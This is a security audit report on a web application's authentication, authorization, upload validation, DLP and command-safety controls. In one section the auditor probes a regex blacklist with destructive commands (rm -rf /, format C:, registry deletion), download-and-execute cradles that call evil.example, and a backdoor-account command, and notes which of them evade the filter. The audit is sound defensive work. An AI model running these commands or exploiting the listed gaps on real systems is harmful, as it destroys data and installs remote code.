# 08 — Authentication & Security Analysis

Rule applied: a mechanism is called **Implemented** only if code evidence is cited; otherwise **Missing**.

## 1. Identity & sessions

| Mechanism | Status | Evidence |
|---|---|---|
| Registration | ❌ none (admin/CLI-provisioned only) | `routes_auth.py`, `auth/cli.py` |
| Password hashing | ✅ scrypt N=16384 r=8 p=1, 16-byte salt, constant-time compare | `auth/passwords.py` |
| Timing equalisation for unknown users | ✅ dummy hash verify | `passwords.verify_dummy_password`, `user_store.authenticate` |
| Password policy | 🟡 min length 8 only | `user_store.create_user/update_user` |
| Password change/reset by user | ❌ | no endpoint |
| JWT | ✅ HS256, required `exp,iat,sub,jti,iss,aud`, issuer/audience checked | `tokens.decode_local_token` |
| JWT secret handling | ✅ fail-closed: `ELONE_JWT_SECRET` ≥16 chars or explicit `ELONE_ALLOW_INSECURE_DEV_KEY=1` → ephemeral per-process secret | `auth/config.get_jwt_secret` |
| Token expiry | ✅ 30 min humans / 480 min agents (env-tunable) | `config.py` |
| Refresh tokens | ❌ | — (user is signed out after TTL) |
| Revocation | ✅ persistent jti store, checked on every request; logout revokes | `tokens.RevocationStore` |
| Account disable | ✅ checked each request via `user_store.get_by_sub` | `dependencies.authenticate_request` (not applied to OIDC users absent from store) |
| Brute-force lockout | ✅ 5 fails / 300 s per (client IP, username), in-memory | `user_store.LoginRateLimiter` |
| Cookies | ✅ `HttpOnly`, `SameSite=Lax`, scoped to `/api`; 🟡 `Secure` only if `ELONE_COOKIE_SECURE` (default **false**) | `routes_auth.api_auth_login` |
| CSRF | ✅ double-submit with `hmac.compare_digest` on cookie-auth mutations; ❌ login endpoint not protected (login-CSRF, low) | `dependencies.csrf_protect` |
| OIDC/SSO | ✅ code path (JWKS cache, role/tenant/clearance claim mapping, hybrid mode) — unverified against a real IdP | `tokens.decode_oidc_token` |
| MFA | ❌ |

## 2. Authorization
- **RBAC**: `authenticate_request(allowed_roles, human_only, check_csrf)` called by each handler. Capability map `compute_capabilities` drives UI only; server uses role checks.
- **Single-gate separation (“Option A”)**: only `security_reviewer` may decide; only `process_owner` may upload/edit/publish; `admin` cannot approve or publish. ✅ (`enforce_review_task_eligibility`, route role lists; covered by `test_auth_and_cors.py`).
- **Separation of duties**: reviewer ≠ uploader, reviewer ≠ last editor, compared by lower-cased *identity* string. ✅ `sod_policy.verify_separation_of_duties`.
- **Tenant isolation**: `enforce_tenant_access` + per-route filters. ✅ app-layer only.
- **Clearance**: `principal.can_access_tier(tier)`; reviewers need clearance ≥ SOP tier; agents persona max clearance validated at account creation (`PERSONA_DEFAULT_CLEARANCE`). ✅
- 🟡 `normalize_clearance()` **returns `L0` (lowest) for unrecognised input**, i.e. fail-open when used on a *resource* tier.
- 🟡 Claims (roles/tenant/clearance) are baked in the JWT ⇒ demotion takes effect only at token expiry (30 min humans, 8 h agents); no endpoint lists or revokes an issued agent token other than disabling the account.
- Audit: ✅ `auth_events.jsonl` (login success/failure/lockout, access_denied with reason, user_created/updated, agent_token_issued, config_updated). No integrity protection or rotation.

## 3. Input validation & sanitisation
| Area | Status |
|---|---|
| Upload filename → `sanitize_filename` (basename, strips `..`, whitelist chars) | ✅ |
| Extension allow-list + magic bytes (PDF/ZIP/OLE/text, dangerous binaries) + zip-bomb (ratio >20× & >10 MB, 50 MB cap) + page/word/row caps | ✅ (`intake_validator`, `utils/security.check_zip_bomb`) |
| Image guard: magic bytes, pixel-bomb 4096 px, downscale to 1024, fail-closed | ✅ |
| Whole upload read into memory before size check | 🟡 DoS surface |
| Path traversal in SOP ids/logs/tenants | ✅ regex + `_inside()` realpath checks |
| SQL injection | n/a (no SQL) |
| XSS | ✅ frontend escapes every interpolation with `esc()` (`ui.js:15`); CSP/headers ❌ |
| Security response headers (CSP, X-Frame-Options, HSTS, nosniff) | ❌ none in `server.py` |
| CORS | ✅ explicit origins, wildcard rejected with credentials, explicit methods/headers |
| Rate limiting (API, upload, ingest) | ❌ only login |
| Prompt-injection defence | ✅ delimiter escaping, untrusted-payload prompt framing, VLM text labelled passive, validator LLM with injection flag, regex scan of raw text; ⚠ probabilistic (see 10) |
| SSRF | ✅ `is_safe_external_url` (DNS pre-resolve, big block-list) — *module not used in live ingest* and has a DNS-rebinding TOCTOU |
| Secrets in env | ✅ `.env` gitignored; keys never logged by app; ⚠ `ELONE_PLAYBOOK_SIGNING_KEY` undocumented in `.env.example` |

## <a name="dlp"></a>4. DLP / secret quarantine — verified behaviours
I executed `redact_sensitive_dlp` (pure function) on sample text:
1. `password: ResetMe2026!` → **not detected** (value contains the allow-listed substring `reset`). The placeholder list (`utils/security.DOCUMENTATION_SECRET_PLACEHOLDERS`) is matched by *substring* and includes common words (`reset`, `change`, `policy`, `management`, `rotation`, `example`, `todo`). Real passwords containing these words evade both redaction and quarantine.
2. For **PDF/DOCX**, `extract_ordered_sop_content` already redacts secrets (`_apply_security_sanitization_to_segments`) *before* the route counts them. A second scan then finds `Password: [DLP_REDACTED_PASSWORD]` again (counted, ⇒ quarantine) but **API keys/vendor tokens, once replaced, are no longer counted** ⇒ a PDF with only an API key is silently redacted, not quarantined, no incident. For `.txt/.md`, extraction does not redact, so quarantine triggers for all types but **emails/phones are sent to the LLM unmasked** (route discards the redacted copy).
3. Embedded **screenshots**: VLM text reports are appended to the LLM prompt but the secret scan only covers text segments; secrets visible in images are neither scanned nor quarantined.
4. `/api/plan-preview` and MCP `plan_sop` skip quarantine/AST scanning entirely.
5. Detection = regex + Shannon entropy > 4.3 on 24–80-char tokens containing a digit.

## 5. Command-safety controls (what protects downstream execution)
Regex blacklist of 10 patterns (`MALICIOUS_COMMAND_PATTERNS`) applied at ingest (raw text), draft edit, Layer-1 validation, and publish-gate 5. **Probe results (I ran `scan_commands_for_ast_threats` on each string):** *allowed* → `Remove-Item -Recurse -Force C:\Users`, `rm -rf /`, `Stop-Computer -Force`, `format C: /q`, `reg delete HKLM\Software /f`, `Start-BitsTransfer -Source http://evil.example/a.exe …`, `Invoke-WebRequest http://evil.example/x.ps1 | iex`, `powershell -e SQBFAFgA` (short `-e` form); *blocked* → `iex (New-Object Net.WebClient)…`, `net user backdoor P@ss /add`. So the blacklist targets download-cradle / persistence tricks but **destructive commands pass**; the only remaining protection for those is the LLM validator and the human reviewer. `scan_commands_for_ast_threats` in `utils/security.py` **swallows import/runtime errors and returns `[]`** (fail-open wrapper).

## 6. Integrity (HMAC) model
- `compute_playbook_hmac`: HMAC-SHA256 over canonical JSON of the **frontmatter** (all keys except the two integrity fields). Key from `ELONE_PLAYBOOK_SIGNING_KEY` (fail-closed unless dev flag).
- The Markdown **body is unsigned** (human-readable only); canonical JSON file is **not signed**; the retrieval catalog JSON is **not signed**.
- Anyone who can write `sop*.md` *and* knows the key can forge; anyone holding the key (the web app itself) re-signs on edits (see P0-1 in 13).
- Dev fallback key is a constant in source if `ELONE_ALLOW_INSECURE_DEV_KEY=1` — and the local `.env` currently enables that flag.

## 7. Secrets & configuration hygiene
- `.gitignore` is thorough for `.env`, keys, runtime data, `_auth/`.
- Local `.env` (untracked) defines provider keys, signing key, **`ELONE_ALLOW_INSECURE_DEV_KEY`**, and **no `ELONE_JWT_SECRET`** ⇒ each server restart creates a new ephemeral secret and invalidates all sessions; also `UNLIMITED_DAILY_CALLS=true` disables the daily LLM cost breaker locally.
- Commit `74ff7c7` untracked sensitive files; history before that commit may still contain them (not audited).

## 8. Sensitive-data exposure checks
- ✅ `to_public_dict()` never returns `password_hash`.
- ✅ Login error messages generic.
- 🟡 `str(e)` returned to clients in many 400/500 paths (filesystem paths, config problems).
- 🟡 Draft and log files store source text (`raw_text`, `converter_input` logs) in plaintext; logs are admin-visible per tenant.
- 🟡 `/api/telemetry` and `/api/config` are tenant-agnostic: a tenant admin sees/changes **global** values.
- 🟡 `sops/index.md` (and per-category index) list titles/descriptions of **all tenants' playbooks** and are served by MCP `list_knowledge_base_playbooks`.

## 9. Test evidence
`tests/test_auth_and_cors.py` runs an isolated end-to-end driver (roles × tenants × clearance × CSRF × CORS). In my sandboxed run it passed once `ELONE_PLAYBOOK_SIGNING_KEY` was set. Other security suites: `test_security.py`, `test_prompt_injection_hardening.py`, `test_governance_bypass_disabled.py`, `test_c3_c4_server_gates_and_publish_integrity.py`, `test_config_cost_quarantine_hardening.py`.
